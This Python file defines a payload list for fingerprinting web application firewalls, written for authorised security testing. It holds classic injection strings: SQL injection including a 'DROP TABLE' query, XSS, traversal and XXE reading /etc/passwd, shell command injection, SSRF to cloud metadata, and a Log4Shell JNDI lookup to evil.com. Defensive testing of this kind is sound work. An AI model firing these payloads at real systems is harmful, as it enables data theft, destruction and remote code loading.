#!/usr/bin/env python3
"""
Detection Payloads for Aggressive WAF Fingerprinting

These benign-class payloads are crafted to trigger WAF rules
without causing harm. They resemble common attack patterns that
WAFs are trained to block (SQLi, XSS, LFI, RCE, etc.).

⚠️  Use ONLY on targets you have permission to test.
"""

DETECTION_PAYLOADS = [
    # ── SQL Injection Signatures ──
    {
        "name": "SQLi — Basic OR bypass",
        "payload": "1' OR '1'='1",
        "method": "GET",
        "category": "sqli",
    },
    {
        "name": "SQLi — Union select",
        "payload": "1 UNION SELECT NULL,NULL,NULL--",
        "method": "GET",
        "category": "sqli",
    },
    {
        "name": "SQLi — Stacked query",
        "payload": "1; DROP TABLE test--",
        "method": "GET",
        "category": "sqli",
    },
    {
        "name": "SQLi — Time-based blind",
        "payload": "1' AND SLEEP(5)--",
        "method": "GET",
        "category": "sqli",
    },

    # ── Cross-Site Scripting (XSS) ──
    {
        "name": "XSS — Basic script tag",
        "payload": "<script>alert('xss')</script>",
        "method": "GET",
        "category": "xss",
    },
    {
        "name": "XSS — Event handler",
        "payload": "<img src=x onerror=alert(1)>",
        "method": "GET",
        "category": "xss",
    },
    {
        "name": "XSS — SVG payload",
        "payload": "<svg/onload=alert('xss')>",
        "method": "GET",
        "category": "xss",
    },
    {
        "name": "XSS — Encoded",
        "payload": "%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E",
        "method": "GET",
        "category": "xss",
    },

    # ── Local File Inclusion (LFI) ──
    {
        "name": "LFI — /etc/passwd traversal",
        "payload": "../../../../etc/passwd",
        "method": "GET",
        "category": "lfi",
    },
    {
        "name": "LFI — Null byte bypass",
        "payload": "../../../../etc/passwd%00",
        "method": "GET",
        "category": "lfi",
    },
    {
        "name": "LFI — Windows path",
        "payload": "..\\..\\..\\..\\windows\\win.ini",
        "method": "GET",
        "category": "lfi",
    },

    # ── Remote Code Execution (RCE) ──
    {
        "name": "RCE — Command injection (Linux)",
        "payload": ";cat /etc/passwd",
        "method": "GET",
        "category": "rce",
    },
    {
        "name": "RCE — Pipe injection",
        "payload": "|ls -la",
        "method": "GET",
        "category": "rce",
    },
    {
        "name": "RCE — Backtick execution",
        "payload": "`id`",
        "method": "GET",
        "category": "rce",
    },

    # ── XML/XXE ──
    {
        "name": "XXE — Entity declaration",
        "payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        "method": "POST",
        "category": "xxe",
    },

    # ── SSRF ──
    {
        "name": "SSRF — AWS metadata",
        "payload": "http://169.254.169.254/latest/meta-data/",
        "method": "GET",
        "category": "ssrf",
    },

    # ── Log4Shell style ──
    {
        "name": "JNDI Lookup pattern",
        "payload": "${jndi:ldap://evil.com/a}",
        "method": "GET",
        "category": "log4j",
    },

    # ── Protocol / Header abuse ──
    {
        "name": "User-Agent — Nikto scanner",
        "payload": "Nikto/2.1.6",
        "method": "HEADER_UA",
        "category": "scanner",
    },
    {
        "name": "User-Agent — SQLMap",
        "payload": "sqlmap/1.7",
        "method": "HEADER_UA",
        "category": "scanner",
    },
]
